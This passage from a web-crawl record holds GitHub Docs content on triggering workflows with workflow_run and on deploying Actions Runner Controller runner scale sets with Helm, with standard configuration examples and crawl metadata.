menu, labeled \"Run workflow\" and expanded to show input fields, is outlined in dark orange.](https://docs.github.com/assets/cb-78157/images/help/actions/workflow-dispatch-inputs.png)\n\nYou can also pass inputs when you run a workflow from a script, or by using GitHub CLI. For example:\n\n```\ngh workflow run run-tests.yml -f logLevel=warning -f tags=false -f environment=staging\n```\n\nFor more information, see the GitHub CLI information in [Manually running a workflow](https://docs.github.com/en/actions/managing-workflow-runs/manually-running-a-workflow).\n\n## [`workflow_run`](#workflow_run)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`workflow_run`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#workflow_run)\n\n\\- `completed`  \n\\- `requested`  \n\\- `in_progress`\n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nMore than one activity type triggers this event. The `requested` activity type does not occur when a workflow is re-run. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#workflow_run). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nNote\n\nYou can't use `workflow_run` to chain together more than three levels of workflows. For example, if you attempt to trigger five workflows (named `B` to `F`) to run sequentially after an initial workflow `A` has run (that is: `A` → `B` → `C` → `D` → `E` → `F`), workflows `E` and `F` will not be run.\n\nThis event occurs when a workflow run is requested or completed. It allows you to execute a workflow based on execution or completion of another workflow. The workflow started by the `workflow_run` event is able to access secrets and write tokens, even if the previous workflow was not. This is useful in cases where the previous workflow is intentionally not privileged, but you need to take a privileged action in a later workflow.\n\nIn this example, a workflow is configured to run after the separate \"Run Tests\" workflow completes.\n\n```\non:\n  workflow_run:\n    workflows: [Run Tests]\n    types:\n      - completed\n```\n\nIf you specify multiple `workflows` for the `workflow_run` event, only one of the workflows needs to run. For example, a workflow with the following trigger will run whenever the \"Staging\" workflow or the \"Lab\" workflow completes.\n\n```\non:\n  workflow_run:\n    workflows: [Staging, Lab]\n    types:\n      - completed\n```\n\n### [Running a workflow based on the conclusion of another workflow](#running-a-workflow-based-on-the-conclusion-of-another-workflow)\n\nA workflow run is triggered regardless of the conclusion of the previous workflow. If you want to run a job or step based on the result of the triggering workflow, you can use a conditional with the `github.event.workflow_run.conclusion` property. For example, this workflow will run whenever a workflow named \"Build\" completes, but the `on-success` job will only run if the \"Build\" workflow succeeded, and the `on-failure` job will only run if the \"Build\" workflow failed:\n\n```\non:\n  workflow_run:\n    workflows: [Build]\n    types: [completed]\n\njobs:\n  on-success:\n    runs-on: ubuntu-latest\n    if: ${{ github.event.workflow_run.conclusion == 'success' }}\n    steps:\n      - run: echo 'The triggering workflow passed'\n  on-failure:\n    runs-on: ubuntu-latest\n    if: ${{ github.event.workflow_run.conclusion == 'failure' }}\n    steps:\n      - run: echo 'The triggering workflow failed'\n```\n\n### [Limiting your workflow to run based on branches](#limiting-your-workflow-to-run-based-on-branches)\n\nYou can use the `branches` or `branches-ignore` filter to specify what branches the triggering workflow must run on in order to trigger your workflow. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onworkflow_runbranchesbranches-ignore). For example, a workflow with the following trigger will only run when the workflow named `Build` runs on a branch named `canary`.\n\n```\non:\n  workflow_run:\n    workflows: [Build]\n    types: [requested]\n    branches: [canary]\n```\n\n### [Using data from the triggering workflow](#using-data-from-the-triggering-workflow)\n\nYou can access the [`workflow_run` event payload](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#workflow_run) that corresponds to the workflow that triggered your workflow. For example, if your triggering workflow generates artifacts, a workflow triggered with the `workflow_run` event can access these artifacts.\n\nThe following workflow uploads data as an artifact. (In this simplified example, the data is the pull request number.)\n\n```\nname: Upload data\n\non:\n  pull_request:\n\njobs:\n  upload:\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Save PR number\n        env:\n          PR_NUMBER: ${{ github.event.number }}\n        run: |\n          mkdir -p ./pr\n          echo $PR_NUMBER > ./pr/pr_number\n      - uses: actions/upload-artifact@v4\n        with:\n          name: pr_number\n          path: pr/\n```\n\nWhen a run of the above workflow completes, it triggers a run of the following workflow. The following workflow uses the `github.event.workflow_run` context and the GitHub REST API to download the artifact that was uploaded by the above workflow, unzips the downloaded artifact, and comments on the pull request whose number was uploaded as an artifact.\n\n```\nname: Use the data\n\non:\n  workflow_run:\n    workflows: [Upload data]\n    types:\n      - completed\n\njobs:\n  download:\n    runs-on: ubuntu-latest\n    steps:\n      - name: 'Download artifact'\n        uses: actions/github-script@v7\n        with:\n          script: |\n            let allArtifacts = await github.rest.actions.listWorkflowRunArtifacts({\n               owner: context.repo.owner,\n               repo: context.repo.repo,\n               run_id: context.payload.workflow_run.id,\n            });\n            let matchArtifact = allArtifacts.data.artifacts.filter((artifact) => {\n              return artifact.name == \"pr_number\"\n            })[0];\n            let download = await github.rest.actions.downloadArtifact({\n               owner: context.repo.owner,\n               repo: context.repo.repo,\n               artifact_id: matchArtifact.id,\n               archive_format: 'zip',\n            });\n            const fs = require('fs');\n            const path = require('path');\n            const temp = '${{ runner.temp }}/artifacts';\n            if (!fs.existsSync(temp)){\n              fs.mkdirSync(temp);\n            }\n            fs.writeFileSync(path.join(temp, 'pr_number.zip'), Buffer.from(download.data));\n\n      - name: 'Unzip artifact'\n        run: unzip pr_number.zip -d \"${{ runner.temp }}/artifacts\"\n\n      - name: 'Comment on PR'\n        uses: actions/github-script@v7\n        with:\n          github-token: ${{ secrets.GITHUB_TOKEN }}\n          script: |\n            const fs = require('fs');\n            const path = require('path');\n            const temp = '${{ runner.temp }}/artifacts';\n            const issue_number = Number(fs.readFileSync(path.join(temp, 'pr_number')));\n            await github.rest.issues.createComment({\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              issue_number: issue_number,\n              body: 'Thank you for the PR!'\n            });\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 487,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-events-that-trigger-workflows-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-events-that-trigger-workflows-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-events-that-trigger-workflows-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-events-that-trigger-workflows-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-events-that-trigger-workflows-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 119865,
      "readableText": 111279,
      "none": 151285,
      "readableTextIfPossible": 111279,
      "result": 111279,
      "markdown": 81074
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller",
    "loadedTime": "2025-05-08T06:42:49.139Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller",
    "title": "Deploying runner scale sets with Actions Runner Controller - GitHub Docs",
    "description": "Learn how to deploy runner scale sets with Actions Runner Controller, and use advanced configuration options to tailor Actions Runner Controller to your needs.",
    "author": null,
    "keywords": "Actions Runner Controller",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Deploying runner scale sets with Actions Runner Controller - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "8CF1:1F7030:BAFA10:F56058:681C5250",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:37 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686557.954243, VS0, VE483",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "43505",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Deploying runner scale sets with Actions Runner Controller\nLearn how to deploy runner scale sets with Actions Runner Controller, and use advanced configuration options to tailor Actions Runner Controller to your needs.\nLegal notice\nAbout runner scale sets\nRunner scale sets is a group of homogeneous runners that can be assigned jobs from GitHub Actions. The number of active runners owned by a runner scale set can be controlled by auto-scaling runner solutions such as Actions Runner Controller (ARC).\nYou can use runner groups to manage runner scale sets. Similar to self-hosted runners, you can add runner scale sets to existing runner groups. However, runner scale sets can belong to only one runner group at a time and can only have one label assigned to them. For more information on runner groups, see Managing access to self-hosted runners using groups.\nTo assign jobs to a runner scale set, you must configure your workflow to reference the runner scale set's name. For more information, see Using Actions Runner Controller runners in a workflow.\nDeploying a runner scale set\nTo deploy a runner scale set, you must have ARC up and running. For more information, see Quickstart for Actions Runner Controller.\nYou can deploy runner scale sets with ARC's Helm charts or by deploying the necessary manifests. Using ARC's Helm charts is the preferred method, especially if you do not have prior experience using ARC.\nNote\nAs a security best practice, create your runner pods in a different namespace than the namespace containing your operator pods.\nAs a security best practice, create Kubernetes secrets and pass the secret references. Passing your secrets in plain text via the CLI can pose a security risk.\nWe recommend running production workloads in isolation. GitHub Actions workflows are designed to run arbitrary code, and using a shared Kubernetes cluster for production workloads could pose a security risk.\nEnsure you have implemented a way to collect and retain logs from the controller, listeners, and ephemeral runners.\nTo configure your runner scale set, run the following command in your terminal, using values from your ARC configuration.\nWhen you run the command, keep the following in mind.\nUpdate the INSTALLATION_NAME value carefully. You will use the installation name as the value of runs-on in your workflows.\nUpdate the NAMESPACE value to the location you want the runner pods to be created.\nSet the GITHUB_CONFIG_URL value to the URL of your repository, organization, or enterprise. This is the entity that the runners will belong to.\nThis example command installs the latest version of the Helm chart. To install a specific version, you can pass the --version argument with the version of the chart you want to install. You can find the list of releases in the actions-runner-controller repository.\nBash\nINSTALLATION_NAME=\"arc-runner-set\" NAMESPACE=\"arc-runners\" GITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\" GITHUB_PAT=\"<PAT>\" helm install \"${INSTALLATION_NAME}\" \\ --namespace \"${NAMESPACE}\" \\ --create-namespace \\ --set githubConfigUrl=\"${GITHUB_CONFIG_URL}\" \\ --set githubConfigSecret.github_token=\"${GITHUB_PAT}\" \\ oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set \nFor additional Helm configuration options, see values.yaml in the ARC repository.\nTo check your installation, run the following command in your terminal.\nYou should see an output similar to the following.\nNAME NAMESPACE REVISION UPDATED STATUS CHART APP VERSION arc arc-systems 1 2023-04-12 11:45:59.152090536 +0000 UTC deployed gha-runner-scale-set-controller-0.4.0 0.4.0 arc-runner-set arc-systems 1 2023-04-12 11:46:13.451041354 +0000 UTC deployed gha-runner-scale-set-0.4.0 0.4.0 \nTo check the manager pod, run the following command in your terminal.\nBash\nkubectl get pods -n arc-systems \nIf the installation was successful, the pods will show the Running status.\nNAME READY STATUS RESTARTS AGE arc-gha-runner-scale-set-controller-594cdc976f-m7cjs 1/1 Running 0 64s arc-runner-set-754b578d-listener 1/1 Running 0 12s \nIf your installation was not successful, see Troubleshooting Actions Runner Controller errors for troubleshooting information.\nUsing advanced configuration options\nARC offers several advanced configuration options.\nConfiguring the runner scale set name\nNote\nRunner scale set names are unique within the runner group they belong to. If you want to deploy multiple runner scale sets with the same name, they must belong to different runner groups.\nTo configure the runner scale set name, you can define an INSTALLATION_NAME or set the value of runnerScaleSetName in your copy of the values.yaml file.\n## The name of the runner scale set to create, which defaults to the Helm release name runnerScaleSetName: \"my-runners\" \nMake sure to pass the values.yaml file in your helm install command. See the Helm Install documentation for more details.\nChoosing runner destinations\nRunner scale sets can be deployed at the repository, organization, or enterprise levels.\nTo deploy runner scale sets to a specific level, set the value of githubConfigUrl in your copy of the values.yaml to the URL of your repository, organization, or enterprise.\nThe following example shows how to configure ARC to add runners to octo-org/octo-repo.\ngithubConfigUrl: \"https://github.com/octo-ent/octo-org/octo-repo\" \nFor additional Helm configuration options, see values.yaml in the ARC repository.\nUsing a GitHub App for authentication\nIf you are not using enterprise-level runners, you can use GitHub Apps to authenticate with the GitHub API. For more information, see Authenticating to the GitHub API.\nNote\nGiven the security risk associated with exposing your private key in plain text in a file on disk, we recommend creating a Kubernetes secret and passing the reference instead.\nYou can either create a Kubernetes secret, or specify values in your values.yaml file.\nOption 1: Create a Kubernetes secret (recommended)\nOnce you have created your GitHub App, create a Kubernetes secret and pass the reference to that secret in your copy of the values.yaml file.\nNote\nCreate the secret in the same namespace where the gha-runner-scale-set chart is installed. In this example, the namespace is arc-runners to match the quickstart documentation. For more information, see Quickstart for Actions Runner Controller.\nkubectl create secret generic pre-defined-secret \\ --namespace=arc-runners \\ --from-literal=github_app_id=123456 \\ --from-literal=github_app_installation_id=654321 \\ --from-file=github_app_private_key=private-key.pem \nIn your copy of the values.yaml pass the secret name as a reference.\ngithubConfigSecret: pre-defined-secret \nOption 2: Specify values in your values.yaml file\nAlternatively, you can specify the values of app_id, installation_id and private_key in your copy of the values.yaml file.\n## githubConfigSecret is the Kubernetes secret to use when authenticating with GitHub API. ## You can choose to use a GitHub App or a personal access token (classic) githubConfigSecret: ## GitHub Apps Configuration ## IDs must be strings, use quotes github_app_id: \"123456\" github_app_installation_id: \"654321\" github_app_private_key: | -----BEGIN RSA PRIVATE KEY----- ... HkVN9... ... -----END RSA PRIVATE KEY----- \nFor additional Helm configuration options, see values.yaml in the ARC repository.\nManaging access with runner groups\nYou can use runner groups to control which organizations or repositories have access to your runner scale sets. For more information on runner groups, see Managing access to self-hosted runners using groups.\nTo add a runner scale set to a runner group, you must already have a runner group created. Then set the runnerGroup property in your copy of the values.yaml file. The following example adds a runner scale set to the Octo-Group runner group.\nrunnerGroup: \"Octo-Group\" \nFor additional Helm configuration options, see values.yaml in the ARC repository.\nConfiguring an outbound proxy\nTo force HTTP traffic for the controller and runners to go through your outbound proxy, set the following properties in your Helm chart.\nproxy: http: url: http://proxy.com:1234 credentialSecretRef: proxy-auth # a Kubernetes secret with `username` and `password` keys https: url: http://proxy.com:1234 credentialSecretRef: proxy-auth # a Kubernetes secret with `username` and `password` keys noProxy: - example.com - example.org \nARC supports using anonymous or authenticated proxies. If you use authenticated proxies, you will need to set the credentialSecretRef value to reference a Kubernetes secret. You can create a secret with your proxy credentials with the following command.\nNote\nCreate the secret in the same namespace where the gha-runner-scale-set chart is installed. In this example, the namespace is arc-runners to match the quickstart documentation. For more information, see Quickstart for Actions Runner Controller.\nBash\nkubectl create secret generic proxy-auth \\ --namespace=arc-runners \\ --from-literal=username=proxyUsername \\ --from-literal=password=proxyPassword \\ \nFor additional Helm configuration options, see values.yaml in the ARC repository.\nSetting the maximum and minimum number of runners\nThe maxRunners and minRunners properties provide you with a range of options to customize your ARC setup.\nNote\nARC does not support scheduled maximum and minimum configurations. You can use a cronjob or any other scheduling solution to update the configuration on a schedule.\nExample: Unbounded number of runners\nIf you comment out both the maxRunners and minRunners properties, ARC will scale up to the number of jobs assigned to the runner scale set and will scale down to 0 if there aren't any active jobs.\n## maxRunners is the max number of runners the auto scaling runner set will scale up to. # maxRunners: 0 ## minRunners is the min number of idle runners. The target number of runners created will be ## calculated as a sum of minRunners and the number of jobs assigned to the scale set. # minRunners: 0 \nExample: Minimum number of runners\nYou can set the minRunners property to any number and ARC will make sure there is always the specified number of runners active and available to take jobs assigned to the runner scale set at all times.\n## maxRunners is the max number of runners the auto scaling runner set will scale up to. # maxRunners: 0 ## minRunners is the min number of idle runners. The target number of runners created will be ## calculated as a sum of minRunners and the number of jobs assigned to the scale set. minRunners: 20 \nExample: Set maximum and minimum number of runners\nIn this configuration, Actions Runner Controller will scale up to a maximum of 30 runners and will scale down to 20 runners when the jobs are complete.\nNote\nThe value of minRunners can never exceed that of maxRunners, unless maxRunners is commented out.\n## maxRunners is the max number of runners the auto scaling runner set will scale up to. maxRunners: 30 ## minRunners is the min number of idle runners. The target number of runners created will be ## calculated as a sum of minRunners and the number of jobs assigned to the scale set. minRunners: 20 \nExample: Jobs queue draining\nIn certain scenarios you might want to drain the jobs queue to troubleshoot a problem or to perform maintenance on your cluster. If you set both properties to 0, Actions Runner Controller will not create new runner pods when new jobs are available and assigned.\n## maxRunners is the max number of runners the auto scaling runner set will scale up to. maxRunners: 0 ## minRunners is the min number of idle runners. The target number of runners created will be ## calculated as a sum of minRunners and the number of jobs assigned to the scale set. minRunners: 0 \nCustom TLS certificates\nNote\nIf you are using a custom runner image that is not based on the Debian distribution, the following instructions will not work.\nSome environments require TLS certificates that are signed by a custom certificate authority (CA). Since the custom certificate authority certificates are not bundled with the controller or runner containers, you must inject them into their respective trust stores.\ngithubServerTLS: certificateFrom: configMapKeyRef: name: config-map-name key: ca.crt runnerMountPath: /usr/local/share/ca-certificates/ \nWhen you do this, ensure you are using the Privacy Enhanced Mail (PEM) format and that the extension of your certificate is .crt. Anything else will be ignored.\nThe controller executes the following actions.\nCreates a github-server-tls-cert volume containing the certificate specified in certificateFrom.\nMounts that volume on path runnerMountPath/<certificate name>.\nSets the NODE_EXTRA_CA_CERTS environment variable to that same path.\nSets the RUNNER_UPDATE_CA_CERTS environment variable to 1 (as of version 2.303.0, this will instruct the runner to reload certificates on the host).\nARC observes values set in the runner pod template and does not overwrite them.\nFor additional Helm configuration options, see values.yaml in the ARC repository.\nUsing a private container registry\nWarning\nThis Actions Runner Controller customization option may be outside the scope of what GitHub Support can assist with and may cause unexpected behavior when configured incorrectly.\nFor more information about what GitHub Support can assist with, see About support for Actions Runner Controller.\nTo use a private container registry, you can copy the controller image and runner image to your private container registry. Then configure the links to those images and set the imagePullPolicy and imagePullSecrets values.\nConfiguring the controller image\nYou can update your copy of the values.yaml file and set the image properties as follows.\nimage: repository: \"custom-registry.io/gha-runner-scale-set-controller\" pullPolicy: IfNotPresent # Overrides the image tag whose default is the chart appVersion. tag: \"0.4.0\" imagePullSecrets: - name: <registry-secret-name> \nThe listener container inherits the imagePullPolicy defined for the controller.\nConfiguring the runner image\nYou can update your copy of the values.yaml file and set the template.spec properties as follows.\ntemplate: spec: containers: - name: runner image: \"custom-registry.io/actions-runner:latest\" imagePullPolicy: Always command: [\"/home/runner/run.sh\"] imagePullSecrets: - name: <registry-secret-name> \nFor additional Helm configuration options, see values.yaml in the ARC repository.\nUpdating the pod specification for the runner pod\nWarning\nThis Actions Runner Controller customization option may be outside the scope of what GitHub Support can assist with and may cause unexpected behavior when configured incorrectly.\nFor more information about what GitHub Support can assist with, see About support for Actions Runner Controller.\nYou can fully customize the PodSpec of the runner pod and the controller will apply the configuration you specify. The following is an example pod specification.\ntemplate: spec: containers: - name: runner image: ghcr.io/actions/actions-runner:latest command: [\"/home/runner/run.sh\"] resources: limits: cpu: 500m memory: 512Mi securityContext: readOnlyRootFilesystem: true allowPrivilegeEscalation: false capabilities: add: - NET_ADMIN \nFor additional Helm configuration options, see values.yaml in the ARC repository.\nUpdating the pod specification for the listener pod\nWarning\nThis Actions Runner Controller customization option may be outside the scope of what GitHub Support can assist with and may cause unexpected behavior when configured incorrectly.\nFor more information about what GitHub Support can assist with, see About support for Actions Runner Controller.\nYou can customize the PodSpec of the listener pod and the controller will apply the configuration you specify. The following is an example pod specification.\nNote\nIt's important to not change the listenerTemplate.spec.containers.name value of the listener container. Otherwise, the configuration you specify will be applied to a new side-car container.\nlistenerTemplate: spec: containers: # If you change the name of the container, the configuration will not be applied to the listener, # and it will be treated as a side-car container. - name: listener securityContext: runAsUser: 1000 resources: limits: cpu: \"1\" memory: 1Gi requests: cpu: \"1\" memory: 1Gi \nFor additional Helm configuration options, see values.yaml in the ARC repository.\nUsing Docker-in-Docker or Kubernetes mode for containers\nWarning\nThis Actions Runner Controller customization option may be outside the scope of what GitHub Support can assist with and may cause unexpected behavior when configured incorrectly.\nFor more information about what GitHub Support can assist with, see About support for Actions Runner Controller.\nIf you are using container jobs and services or container actions, the containerMode value must be set to dind or kubernetes.\nFor more information on container jobs and services, see Running jobs in a container.\nFor more information on container actions, see Creating a Docker container action.\nUsing Docker-in-Docker mode\nNote\nThe Docker-in-Docker container requires privileged mode. For more information, see Configure a Security Context for a Pod or Container in the Kubernetes documentation.\nBy default, the dind container uses the docker:dind image, which runs the Docker daemon as root. You can replace this image with docker:dind-rootless as long as you are aware of the known limitations and run the pods with --privileged mode. To learn how to customize the Docker-in-Docker configuration, see Customizing container modes.\nDocker-in-Docker mode is a configuration that allows you to run Docker inside a Docker container. In this configuration, for each runner pod created, ARC creates the following containers.\nAn init container\nA runner container\nA dind container\nTo enable Docker-in-Docker mode, set the containerMode.type to dind as follows.\ncontainerMode: type: \"dind\" \nThe template.spec will be updated to the following default configuration.\ntemplate: spec: initContainers: - name: init-dind-externals image: ghcr.io/actions/actions-runner:latest command: [\"cp\", \"-r\", \"/home/runner/externals/.\", \"/home/runner/tmpDir/\"] volumeMounts: - name: dind-externals mountPath: /home/runner/tmpDir containers: - name: runner image: ghcr.io/actions/actions-runner:latest command: [\"/home/runner/run.sh\"] env: - name: DOCKER_HOST value: unix:///var/run/docker.sock volumeMounts: - name: work mountPath: /home/runner/_work - name: dind-sock mountPath: /var/run - name: dind image: docker:dind args: - dockerd - --host=unix:///var/run/docker.sock - --group=$(DOCKER_GROUP_GID) env: - name: DOCKER_GROUP_GID value: \"123\" securityContext: privileged: true volumeMounts: - name: work mountPath: /home/runner/_work - name: dind-sock mountPath: /var/run - name: dind-externals mountPath: /home/runner/externals volumes: - name: work emptyDir: {} - name: dind-sock emptyDir: {} - name: dind-externals emptyDir: {} \nThe values in template.spec are automatically injected and cannot be overridden. If you want to customize this setup, you must unset containerMode.type, then copy this configuration and apply it directly in your copy of the values.yaml file.\nFor additional Helm configuration options, see values.yaml in the ARC repository.\nUsing Kubernetes mode\nIn Kubernetes mode, ARC uses runner container hooks to create a new pod in the same namespace to run the service, container job, or action.\nPrerequisites\nKubernetes mode relies on persistent volumes to share job details between the runner pod and the container job pod. For more information, see the Persistent Volumes section in the Kubernetes documentation.\nTo use Kubernetes mode, you must do the following.\nCreate persistent volumes available for the runner pods to claim.\nUse a solution to automatically provision persistent volumes on demand.\nFor testing, you can use a solution like OpenEBS.\nConfiguring Kubernetes mode\nTo enable Kubernetes mode, set the containerMode.type to kubernetes in your values.yaml file.\ncontainerMode: type: \"kubernetes\" kubernetesModeWorkVolumeClaim: accessModes: [\"ReadWriteOnce\"] storageClassName: \"dynamic-blob-storage\" resources: requests: storage: 1Gi \nFor additional Helm configuration options, see values.yaml in the ARC repository.\nNote\nWhen Kubernetes mode is enabled, workflows that are not configured with a container job will fail with an error similar to:\nJobs without a job container are forbidden on this runner, please add a 'container:' to your job or contact your self-hosted runner administrator. \nTo allow jobs without a job container to run, set ACTIONS_RUNNER_REQUIRE_JOB_CONTAINER to false on your runner container. This instructs the runner to disable this check.\ntemplate: spec: containers: - name: runner image: ghcr.io/actions/actions-runner:latest command: [\"/home/runner/run.sh\"] env: - name: ACTIONS_RUNNER_REQUIRE_JOB_CONTAINER value: \"false\" \nCustomizing container modes\nWhen you set the containerMode in the values.yaml file for the gha-runner-scale-set helm chart, you can use either of the following values:\ndind or\nkubernetes\nDepending on which value you set for the containerMode, a configuration will automatically be injected into the template section of the values.yaml file for the gha-runner-scale-set helm chart.\nSee the dind configuration.\nSee the kubernetes configuration.\nTo customize the spec, comment out or remove containerMode, and append the configuration you want in the template section.\nExample: running dind-rootless\nBefore deciding to run dind-rootless, make sure you are aware of known limitations.\n## githubConfigUrl is the GitHub url for where you want to configure runners ## ex: https://github.com/myorg/myrepo or https://github.com/myorg githubConfigUrl: \"https://github.com/actions/actions-runner-controller\" ## githubConfigSecret is the k8s secrets to use when auth with GitHub API. ## You can choose to use GitHub App or a PAT token githubConfigSecret: my-super-safe-secret ## maxRunners is the max number of runners the autoscaling runner set will scale up to. maxRunners: 5 ## minRunners is the min number of idle runners. The target number of runners created will be ## calculated as a sum of minRunners and the number of jobs assigned to the scale set. minRunners: 0 runnerGroup: \"my-custom-runner-group\" ## name of the runner scale set to create. Defaults to the helm release name runnerScaleSetName: \"my-awesome-scale-set\" ## template is the PodSpec for each runner Pod ## For reference: https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/#PodSpec template: spec: initContainers: - name: init-dind-externals image: ghcr.io/actions/actions-runner:latest command: [\"cp\", \"-r\", \"/home/runner/externals/.\", \"/home/runner/tmpDir/\"] volumeMounts: - name: dind-externals mountPath: /home/runner/tmpDir - name: init-dind-rootless image: docker:dind-rootless command: - sh - -c - | set -x cp -a /etc/. /dind-etc/ echo 'runner:x:1001:1001:runner:/home/runner:/bin/ash' >> /dind-etc/passwd echo 'runner:x:1001:' >> /dind-etc/group echo 'runner:100000:65536' >> /dind-etc/subgid echo 'runner:100000:65536' >> /dind-etc/subuid chmod 755 /dind-etc; chmod u=rwx,g=rx+s,o=rx /dind-home chown 1001:1001 /dind-home securityContext: runAsUser: 0 volumeMounts: - mountPath: /dind-etc name: dind-etc - mountPath: /dind-home name: dind-home containers: - name: runner image: ghcr.io/actions/actions-runner:latest command: [\"/home/runner/run.sh\"] env: - name: DOCKER_HOST value: unix:///run/user/1001/docker.sock securityContext: privileged: true runAsUser: 1001 runAsGroup: 1001 volumeMounts: - name: work mountPath: /home/runner/_work - name: dind-sock mountPath: /run/user/1001 - name: dind image: docker:dind-rootless args: - dockerd - --host=unix:///run/user/1001/docker.sock securityContext: privileged: true runAsUser: 1001 runAsGroup: 1001 volumeMounts: - name: work mountPath: /home/runner/_work - name: dind-sock mountPath: /run/user/1001 - name: dind-externals mountPath: /home/runner/externals - name: dind-etc mountPath: /etc - name: dind-home mountPath: /home/runner volumes: - name: work emptyDir: {} - name: dind-externals emptyDir: {} - name: dind-sock emptyDir: {} - name: dind-etc emptyDir: {} - name: dind-home emptyDir: {} \nUnderstanding runner-container-hooks\nWhen the runner detects a workflow run that uses a container job, service container, or Docker action, it will call runner-container-hooks to create a new pod. The runner relies on runner-container-hooks to call the Kubernetes APIs and create a new pod in the same namespace as the runner pod. This newly created pod will be used to run the container job, service container, or Docker action. For more information, see the runner-container-hooks repository.\nConfiguring hook extensions\nAs of ARC version 0.4.0, runner-container-hooks support hook extensions. You can use these to configure the pod created by runner-container-hooks. For example, you could use a hook extension to set a security context on the pod. Hook extensions allow you to specify a YAML file that is used to update the PodSpec of the pod created by runner-container-hooks.\nThere are two options to configure hook extensions.\nStore in your custom runner image. You can store the PodSpec in a YAML file anywhere in your custom runner image. For more information, see About Actions Runner Controller.\nStore in a ConfigMap. You can create a config map with the PodSpec and mount that config map in the runner container. For more information, see ConfigMaps in the Kubernetes 